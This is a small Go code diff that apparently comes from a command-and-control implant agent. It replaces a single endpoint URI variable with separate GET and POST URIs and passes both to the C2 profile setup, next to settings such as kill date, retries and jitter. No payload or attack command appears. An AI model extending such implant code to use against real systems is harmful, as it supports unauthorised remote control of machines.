@@ -33,7 +33,8 @@ var (
 	killDate          string = "0"
 	maxRetries        string = "10"
 	debug             string = "false"
-	endpointURI       string = "/data"
+	getURI            string = "/data"
+	postURI           string = "/data"
 )
 
 func main() {
@@ -98,7 +99,8 @@ func main() {
 		sleepIntervalInt,
 		jitterInt,
 		debugBool,
-		endpointURI,
+		getURI,
+		postURI,
 	)
 
 	// Initialize C2 profile
